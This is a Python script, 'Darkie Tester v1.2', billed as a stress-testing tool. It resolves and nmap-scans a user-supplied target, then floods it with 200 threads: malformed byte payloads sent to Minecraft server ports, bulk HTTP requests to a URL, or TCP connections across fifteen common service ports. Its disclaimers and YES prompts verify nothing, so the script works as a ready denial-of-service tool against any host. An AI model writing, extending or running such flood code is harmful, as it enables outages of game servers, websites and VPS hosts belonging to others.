#!/usr/bin/env python3
"""
Darkie Tester v1.2 — Enhanced Network Stress Testing Tool
For testing your OWN infrastructure only. Unauthorized use is illegal.
"""

import importlib
import os
import platform
import shutil
import socket
import subprocess
import sys
import textwrap
import time
import re
import threading
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

warnings.filterwarnings("ignore")

MISSING_PIPS = []
MISSING_SYSTEM = []

PIP_DEPS = {
    "colorama": "colorama",
    "requests": "requests",
}

SYSTEM_DEPS_COMMON = {
    "nmap": "nmap",
    "host": "host",
    "figlet": "figlet",
}

SYSTEM_DEPS_BY_MGR = {
    "apt":     {"host": "dnsutils"},
    "dnf":     {"host": "bind-utils"},
    "pacman":  {"host": "bind-tools"},
    "apk":     {"host": "bind-tools"},
    "zypper":  {"host": "bind-utils"},
    "brew":    {"host": "bind"},
    "choco":   {"host": "bind-tool"},
}

GRADIENT = [
    "\033[38;5;46m",
    "\033[38;5;47m",
    "\033[38;5;48m",
    "\033[38;5;49m",
    "\033[38;5;50m",
    "\033[38;5;51m",
    "\033[38;5;45m",
    "\033[38;5;39m",
]

G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
R = "\033[91m"
M = "\033[95m"
B = "\033[1m"
DIM = "\033[2m"
N = "\033[0m"

# Unicode symbols (defined as variables for f-string compat in Python <3.12)
SYM_CHECK = "\u2713"
SYM_X = "\u2717"
SYM_WARN = "\u26a0"
SYM_ARROW = "\u2192"
SYM_PROMPT = "\u279c"
SYM_CLOCK = "\u23f0"
SYM_BLOCK_FULL = "\u2588"
SYM_BLOCK_EMPTY = "\u2591"
SYM_BOX_TL = "\u2554"
SYM_BOX_TR = "\u2557"
SYM_BOX_BL = "\u255a"
SYM_BOX_BR = "\u255d"
SYM_BOX_H = "\u2550"
SYM_BOX_V = "\u2551"
SYM_LINE_H = "\u2500"
SYM_LINE_V = "\u251c"


def _detect_os():
    system = platform.system().lower()
    if system == "linux":
        try:
            with open("/etc/os-release") as f:
                data = f.read()
        except FileNotFoundError:
            return "linux", "unknown"
        if re.search(r'ID=("?)debian', data) or re.search(r'ID_LIKE=.*debian', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(ubuntu|linuxmint|pop|kali)', data):
            return "linux", "apt"
        if re.search(r'ID=("?)(rhel|centos|fedora|rocky|alma)', data):
            return "linux", "dnf"
        if re.search(r'ID=("?)(arch|manjaro|endeavour)', data):
            return "linux", "pacman"
        if re.search(r'ID=("?)alpine', data):
            return "linux", "apk"
        if re.search(r'ID=("?)(opensuse|suse)', data):
            return "linux", "zypper"
        return "linux", "unknown"
    elif system == "darwin":
        return "macos", "brew"
    elif system == "windows":
        return "windows", "choco"
    return system, "unknown"


def _check_pip_deps():
    global MISSING_PIPS
    for mod, pkg in PIP_DEPS.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            MISSING_PIPS.append(pkg)


def _check_system_deps():
    global MISSING_SYSTEM
    _, pkg_mgr = _detect_os()
    per_mgr = SYSTEM_DEPS_BY_MGR.get(pkg_mgr, {})
    for cmd, default_pkg in SYSTEM_DEPS_COMMON.items():
        if shutil.which(cmd) is None:
            pkg = per_mgr.get(cmd, default_pkg)
            MISSING_SYSTEM.append((cmd, pkg))


PKG_MANAGERS = {
    "apt":     {"install": ["apt-get", "install", "-y", "-qq"], "update": ["apt-get", "update", "-qq"]},
    "dnf":     {"install": ["dnf", "install", "-y"], "update": None},
    "pacman":  {"install": ["pacman", "-S", "--noconfirm"], "update": ["pacman", "-Sy"]},
    "apk":     {"install": ["apk", "add"], "update": ["apk", "update"]},
    "zypper":  {"install": ["zypper", "install", "-y"], "update": ["zypper", "refresh"]},
    "brew":    {"install": ["brew", "install"], "update": ["brew", "update"]},
    "choco":   {"install": ["choco", "install", "-y"], "update": None},
}


def _run_as_admin(cmd_list, reason=""):
    desc = " ".join(cmd_list)
    print(f"  {C}{reason or desc}{N}")
    try:
        r = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
        if r.returncode == 0:
            print(f"  {G}{SYM_CHECK}  Success{N}")
        else:
            print(f"  {R}{SYM_X}  Failed (exit {r.returncode}){N}")
            if r.stderr.strip():
                for line in r.stderr.strip().splitlines()[-3:]:
                    print(f"    {R}{line}{N}")
        return r.returncode == 0
    except Exception as e:
        print(f"  {R}{SYM_X}  Error: {e}{N}")
        return False


def _install_missing():
    os_name, pkg_mgr = _detect_os()

    if MISSING_PIPS:
        print(f"\n  {Y}Installing Python packages: {', '.join(MISSING_PIPS)}{N}")
        pip_cmd = [sys.executable, "-m", "pip", "install"] + MISSING_PIPS
        _run_as_admin(pip_cmd, "pip install " + " ".join(MISSING_PIPS))

    if MISSING_SYSTEM:
        missing_names = [pkg for _, pkg in MISSING_SYSTEM]
        print(f"\n  {Y}Installing system packages: {', '.join(missing_names)}{N}")

        info = PKG_MANAGERS.get(pkg_mgr)
        if info is None:
            print(f"  {R}{SYM_X}  Unsupported package manager for {pkg_mgr}")
            print(f"    Install manually: {' '.join(missing_names)}{N}")
            return

        for cmd, pkg in MISSING_SYSTEM:
            if info["update"]:
                _run_as_admin(info["update"], f"Updating {pkg_mgr} cache")
                break

        install_cmd = info["install"] + [pkg for _, pkg in MISSING_SYSTEM]
        _run_as_admin(install_cmd, f"Installing with {pkg_mgr}")


def ensure_deps():
    print(f"\n{C}{B}{SYM_BOX_TL}{'='*50}{SYM_BOX_TR}{N}")
    print(f"{C}{B}{SYM_BOX_V}  Checking dependencies...{' ' * 29}{SYM_BOX_V}{N}")
    print(f"{C}{B}{SYM_BOX_BL}{'='*50}{SYM_BOX_BR}{N}")

    _check_pip_deps()
    _check_system_deps()

    if MISSING_PIPS or MISSING_SYSTEM:
        if MISSING_PIPS:
            print(f"  {Y}{SYM_WARN}  Missing Python packages: {', '.join(MISSING_PIPS)}{N}")
        if MISSING_SYSTEM:
            missing_names = [pkg for _, pkg in MISSING_SYSTEM]
            print(f"  {Y}{SYM_WARN}  Missing system tools: {', '.join(missing_names)}{N}")
        print()
        choice = input(f"  {C}Install missing dependencies? (yes/no) {SYM_PROMPT} {N}").strip().lower()
        if choice == "yes":
            _install_missing()
            print()
            _check_pip_deps()
            _check_system_deps()
            if MISSING_PIPS or MISSING_SYSTEM:
                print(f"  {R}{SYM_X}  Some deps still missing. Trying to continue anyway...{N}")
            else:
                print(f"  {G}{SYM_CHECK}  All dependencies satisfied!{N}")
        else:
            print(f"  {Y}{SYM_WARN}  Skipping installation. Script may not work correctly.{N}")
    else:
        print(f"  {G}{SYM_CHECK}  All dependencies found!{N}")


ensure_deps()

from colorama import init, Fore, Style, Back
import requests as req_lib

init(autoreset=True)


BANNER_LINES = [
    " _____             _    _        _______        _",
    "|  __ \\           | |  (_)      |__   __|      | |",
    "| |  | | __ _ _ __| | ___  ___     | | ___  ___| |_ ___ _ __",
    "| |  | |/ _` | '__| |/ / |/ _ \\    | |/ _ \\/ __| __/ _ \\ '__|",
    "| |__| | (_| | |  |   <| |  __/    | |  __/\\__ \\ ||  __/ |",
    "|_____/ \\__,_|_|  |_|\\_\\_|\\___|    |_|\\___||___/\\__\\___|_|",
]


def c(string, color=Fore.GREEN):
    return f"{color}{Style.BRIGHT}{string}{Style.RESET_ALL}"


def c_dim(string, color=Fore.GREEN):
    return f"{color}{Style.DIM}{string}{Style.RESET_ALL}"


def gradient_line(line):
    out = ""
    for i, ch in enumerate(line):
        idx = min(i % len(GRADIENT), len(GRADIENT) - 1)
        out += f"{GRADIENT[idx]}{Style.BRIGHT}{ch}{N}"
    return out


def gradient_banner():
    for line in BANNER_LINES:
        print(f"  {gradient_line(line)}")


def header_box(title, color=Fore.CYAN, width=58):
    top = f"{color}{Style.BRIGHT}{SYM_BOX_TL}{'='*(width-2)}{SYM_BOX_TR}{Style.RESET_ALL}"
    mid = f"{color}{Style.BRIGHT}{SYM_BOX_V} {title.center(width-4)} {SYM_BOX_V}{Style.RESET_ALL}"
    bot = f"{color}{Style.BRIGHT}{SYM_BOX_BL}{'='*(width-2)}{SYM_BOX_BR}{Style.RESET_ALL}"
    print(f"\n{top}\n{mid}\n{bot}\n")


def print_banner():
    gradient_banner()
    header_box("Enhanced Network Stress Testing Tool v1.2", Fore.CYAN)
    label_author = SYM_CLOCK + " Author:"
    label_purpose = SYM_WARN + " Purpose:"
    print(f"  {c(label_author, Fore.CYAN)} Darkie Tester")
    print(f"  {c(label_purpose, Fore.CYAN)} Test your OWN infrastructure only\n")
    print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT} DISCLAIMER {Style.RESET_ALL}{Fore.YELLOW}  Educational use only. You must own or have permission to test the target system.{Style.RESET_ALL}")
    print()


def legal_warning(test_type):
    warn = SYM_WARN * 3
    print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT} {warn}  YOU ARE ABOUT TO LAUNCH A {test_type.upper()} STRESS TEST  {warn} {Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}By proceeding, you confirm you have permission or this is your own system.{Style.RESET_ALL}")
    label = f"Type YES to proceed or anything else to cancel {SYM_PROMPT} "
    choice = input(f"  {c(label, Fore.CYAN)}")
    if choice.strip().upper() != "YES":
        return False
    print()
    return True


def resolve_domain(target):
    ip = target
    try:
        socket.inet_aton(target)
        print(f"  {c(SYM_CHECK + ' Using direct IP:', Fore.GREEN)} {target}")
        return ip
    except OSError:
        pass

    try:
        ip = socket.gethostbyname(target)
        print(f"  {c(SYM_CHECK + ' Resolved:', Fore.GREEN)} {target} {SYM_ARROW} {ip}")
    except socket.gaierror:
        print(f"  {c(SYM_X + ' Could not resolve domain.', Fore.RED)}")
        return None

    try:
        result = subprocess.run(
            ["host", target],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout.strip():
            print(f"  {c('DNS Records:', Fore.CYAN)}")
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f"    {Fore.GREEN}{line}{Style.RESET_ALL}")
    except Exception as e:
        print(f"  {c_dim(f'host command skipped: {e}', Fore.YELLOW)}")
    return ip


MINECRAFT_PORTS = [25565, 25566, 25575, 19132, 19133]


def nmap_scan(target):
    header_box(f"Port Scan: {target}", Fore.MAGENTA)
    open_ports = []

    try:
        print(f"  {c('Phase 1 - Scanning top 100 ports...', Fore.CYAN)}")
        result = subprocess.run(
            ["nmap", "-T4", "-F", target],
            capture_output=True, text=True, timeout=120
        )
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                open_ports.append(int(m.group(1)))
    except Exception as e:
        print(f"  {c_dim(f'Fast scan skipped: {e}', Fore.YELLOW)}")

    try:
        print(f"  {c('Phase 2 - Probing Minecraft ports...', Fore.CYAN)}")
        mc_ports_str = ",".join(str(p) for p in MINECRAFT_PORTS)
        result = subprocess.run(
            ["nmap", "-T4", "-p", mc_ports_str, target],
            capture_output=True, text=True, timeout=60
        )
        for line in result.stdout.splitlines():
            m = re.match(r'^(\d+)/tcp\s+open', line)
            if m:
                port = int(m.group(1))
                if port not in open_ports:
                    open_ports.append(port)
    except Exception as e:
        print(f"  {c_dim(f'Minecraft probe skipped: {e}', Fore.YELLOW)}")

    open_ports.sort()

    if open_ports:
        print(f"\n  {c(SYM_CHECK + ' Open Ports Found:', Fore.GREEN)}")
        for p in open_ports:
            svc = ""
            try:
                svc = socket.getservbyport(p)
            except OSError:
                svc = "unknown"
            tag = f" {Fore.YELLOW}[MINECRAFT]{Style.RESET_ALL}" if p in MINECRAFT_PORTS else ""
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{p}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL}){tag}")
    else:
        print(f"\n  {c('No open ports detected.', Fore.YELLOW)}")

    print(f"\n{Fore.MAGENTA}{SYM_LINE_H*40}{Style.RESET_ALL}")
    return open_ports


def progress_bar(current, total, bar_len=40):
    filled = int(bar_len * current // total) if total else 0
    bar = f"{Fore.GREEN}{SYM_BLOCK_FULL*filled}{Fore.WHITE}{SYM_BLOCK_EMPTY*(bar_len-filled)}{Style.RESET_ALL}"
    pct = f"{Fore.CYAN}{current}/{total}{Style.RESET_ALL}"
    return f"    [{bar}] {pct}"


MINECRAFT_PAYLOADS = [
    b"\x00\xff\xff\xff\xff\x01\x00",
    b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff",
    b"\xfe\x01\x00",
    b"\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    b"\x00" * 64,
    b"\xff" * 128,
]


def _mc_worker(ip, port, results, idx):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((ip, port))
        payload = MINECRAFT_PAYLOADS[idx % len(MINECRAFT_PAYLOADS)]
        sock.sendall(payload)
        sock.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def minecraft_stress(ip, port, num_packets, threads=200):
    header_box(f"Minecraft Stress Test {SYM_ARROW} {ip}:{port}", Fore.RED)
    start = time.time()
    results = {}
    sent = 0
    done = 0
    batch_size = threads * 8

    try:
        for batch_start in range(0, num_packets, batch_size):
            batch_end = min(batch_start + batch_size, num_packets)
            batch = list(range(batch_start, batch_end))
            batch_results = {}

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(_mc_worker, ip, port, batch_results, i): i
                    for i in batch
                }
                for f in as_completed(futures):
                    f.result()

            for v in batch_results.values():
                sent += v
                done += 1

            pct = min(done, num_packets)
            sys.stdout.write(f"\r{progress_bar(pct, num_packets)}  "
                             f"{c(f'Sent: {sent}', Fore.GREEN)}  "
                             f"{c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()

        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted by user.', Fore.YELLOW)}")

    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} packets "
          f"in {c(f'{elapsed:.1f}s', Fore.CYAN)} "
          f"({c(f'{sent/elapsed:.1f} pkt/s', Fore.MAGENTA)})\n")


def _http_worker(session, url, results, idx):
    try:
        session.get(url, timeout=8, headers={
            "User-Agent": "DarkieTester/1.2 (Educational)"
        })
        results[idx] = 1
    except Exception:
        results[idx] = 0


def http_stress(url, num_requests, threads=200):
    header_box(f"Web Stress Test {SYM_ARROW} {url}", Fore.RED)
    start = time.time()
    results = {}
    sent = 0
    done = 0
    batch_size = threads * 8

    try:
        for batch_start in range(0, num_requests, batch_size):
            batch_end = min(batch_start + batch_size, num_requests)
            batch = list(range(batch_start, batch_end))
            batch_results = {}

            with ThreadPoolExecutor(max_workers=threads) as executor:
                with req_lib.Session() as session:
                    futures = {
                        executor.submit(_http_worker, session, url, batch_results, i): i
                        for i in batch
                    }
                    for f in as_completed(futures):
                        f.result()

            for v in batch_results.values():
                sent += v
                done += 1

            pct = min(done, num_requests)
            sys.stdout.write(f"\r{progress_bar(pct, num_requests)}  "
                             f"{c(f'OK: {sent}', Fore.GREEN)}  "
                             f"{c(f'Errors: {done-sent}', Fore.RED)}  ")
            sys.stdout.flush()

        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted by user.', Fore.YELLOW)}")

    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} requests "
          f"in {c(f'{elapsed:.1f}s', Fore.CYAN)} "
          f"({c(f'{sent/elapsed:.1f} req/s', Fore.MAGENTA)})\n")


def _ip_tcp_worker(ip, port, results, idx):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((ip, port))
        sock.sendall(b"GET / HTTP/1.0\r\n\r\n")
        sock.close()
        results[idx] = 1
    except Exception:
        results[idx] = 0


def _ip_flood_worker(ip, ports, results, idx):
    port = ports[idx % len(ports)]
    return _ip_tcp_worker(ip, port, results, idx)


STRESS_PORTS = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 5601, 9090, 3000, 8000, 8888]


def ip_stress(ip, ports, num_connections, threads=200):
    num_ports = len(ports)
    total_work = num_connections * num_ports
    header_box(f"IP Stress Test {SYM_ARROW} {ip} ({num_ports} ports, {total_work} total connections)", Fore.RED)
    start = time.time()
    sent = 0
    done = 0
    batch_size = threads * 8

    try:
        for batch_start in range(0, total_work, batch_size):
            batch_end = min(batch_start + batch_size, total_work)
            batch = list(range(batch_start, batch_end))
            batch_results = {}

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {
                    executor.submit(_ip_flood_worker, ip, ports, batch_results, i): i
                    for i in batch
                }
                for f in as_completed(futures):
                    f.result()

            for v in batch_results.values():
                sent += v
                done += 1

            pct = min(done, total_work)
            sys.stdout.write(f"\r{progress_bar(pct, total_work)}  "
                             f"{c(f'OK: {sent}', Fore.GREEN)}  "
                             f"{c(f'Errors: {done-sent}', Fore.RED)}  "
                             f"{c(f'Ports: {num_ports}', Fore.MAGENTA)}  ")
            sys.stdout.flush()

        print()
    except KeyboardInterrupt:
        print(f"\n\n  {c(SYM_WARN + ' Interrupted by user.', Fore.YELLOW)}")

    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + ' Complete!', Fore.GREEN)} Sent {c(str(sent), Fore.CYAN)} connections "
          f"across {c(str(num_ports), Fore.MAGENTA)} ports "
          f"in {c(f'{elapsed:.1f}s', Fore.CYAN)} "
          f"({c(f'{sent/elapsed:.1f} conn/s', Fore.MAGENTA)})\n")


def normalize_url(url):
    url = url.strip()
    if not url:
        return None
    parsed = urlparse(url)
    if not parsed.scheme:
        choice = input(f"  {c(f'Use HTTPS? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
        if choice == "yes":
            url = "https://" + url
        else:
            url = "http://" + url
    return url


def main():
    print_banner()

    while True:
        header_box("Select Test Type", Fore.CYAN)
        print(f"  {c('[1]', Fore.GREEN)}  Minecraft Server Stress Test")
        print(f"  {c('[2]', Fore.GREEN)}  Web Server Stress Test")
        print(f"  {c('[3]', Fore.GREEN)}  IP Stress Test  {Fore.YELLOW}(Multi-Port VPS Flood){N}")
        print()

        choice = input(f"  {c(f'Enter choice (1, 2, or 3) {SYM_PROMPT} ', Fore.CYAN)}").strip()

        if choice == "1":
            if not legal_warning("Minecraft"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue
            target = input(f"  {c(f'Enter Minecraft server IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not target:
                print(f"  {c('No target provided.', Fore.RED)}")
                continue

            ip = resolve_domain(target)
            if ip is None:
                print(f"  {c('Try entering the IP directly instead.', Fore.YELLOW)}")
                continue
            open_ports = nmap_scan(ip)

            if open_ports:
                print(f"\n  {c('Available ports from scan:', Fore.CYAN)} {c(str(open_ports), Fore.GREEN)}")
                port_input = input(f"  {c(f'Enter port to test (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565
            else:
                print(f"\n  {c('No open ports auto-detected. Specify port manually.', Fore.YELLOW)}")
                port_input = input(f"  {c(f'Enter port to test (default 25565) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                port = int(port_input) if port_input.isdigit() else 25565

            num_input = input(f"  {c(f'Number of packets to send (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_packets = int(num_input) if num_input.isdigit() else 500

            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {ip}:{port}  |  PACKETS: {num_packets}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            confirm = input(f"\n  {c(f'Launch test? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
            if confirm != "yes":
                print(f"  {c('Aborted.', Fore.RED)}")
                continue

            minecraft_stress(ip, port, num_packets)

        elif choice == "2":
            if not legal_warning("Web"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue
            url = input(f"  {c(f'Enter URL (e.g. https://example.com) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not url:
                print(f"  {c('No URL provided.', Fore.RED)}")
                continue

            url = normalize_url(url)
            if url is None:
                continue

            num_input = input(f"  {c(f'Number of requests to send (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_requests = int(num_input) if num_input.isdigit() else 500

            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {url}  |  REQUESTS: {num_requests}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            confirm = input(f"\n  {c(f'Launch test? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
            if confirm != "yes":
                print(f"  {c('Aborted.', Fore.RED)}")
                continue

            http_stress(url, num_requests)

        elif choice == "3":
            if not legal_warning("IP"):
                print(f"  {c('Test cancelled.', Fore.RED)}")
                continue
            ip_input = input(f"  {c(f'Enter target IP address {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if not ip_input:
                print(f"  {c('No IP provided.', Fore.RED)}")
                continue

            try:
                socket.inet_aton(ip_input)
            except OSError:
                print(f"  {c('Invalid IP address format.', Fore.RED)}")
                continue

            print(f"\n  {c('Port Selection:', Fore.CYAN)}")
            print(f"  {c('[a]', Fore.GREEN)}  Auto-select common ports ({len(STRESS_PORTS)} ports)")
            print(f"  {c('[m]', Fore.GREEN)}  Manual port entry")
            port_choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()

            if port_choice == "m":
                ports_input = input(f"  {c(f'Enter ports (comma-separated, e.g. 80,443,8080) {SYM_PROMPT} ', Fore.CYAN)}").strip()
                try:
                    ports = [int(p.strip()) for p in ports_input.split(",") if p.strip()]
                except ValueError:
                    print(f"  {c('Invalid port list. Using defaults.', Fore.YELLOW)}")
                    ports = STRESS_PORTS[:]
            else:
                ports = STRESS_PORTS[:]
                print(f"  {c('Using ports:', Fore.CYAN)} {', '.join(str(p) for p in ports)}")

            num_input = input(f"  {c(f'Connections per port (default 500) {SYM_PROMPT} ', Fore.CYAN)}").strip()
            num_conn = int(num_input) if num_input.isdigit() else 500

            total_conn = num_conn * len(ports)
            print(f"\n  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}  TARGET: {ip_input}  |  PORTS: {len(ports)}  |  CONNECTIONS: {total_conn}{Style.RESET_ALL}")
            print(f"  {Back.RED}{Fore.WHITE}{Style.BRIGHT}{SYM_BOX_H*58}{Style.RESET_ALL}")
            confirm = input(f"\n  {c(f'Launch test? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
            if confirm != "yes":
                print(f"  {c('Aborted.', Fore.RED)}")
                continue

            ip_stress(ip_input, ports, num_conn)

        else:
            print(f"  {c('Invalid choice. Run again and select 1, 2, or 3.', Fore.RED)}")
            continue

        cont = input(f"\n  {c(f'Test complete! Run another test? (yes/no) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
        if cont != "yes":
            print(f"\n  {c('Goodbye! Stay ethical.', Fore.GREEN)}\n")
            break
        print()


if __name__ == "__main__":
    main()
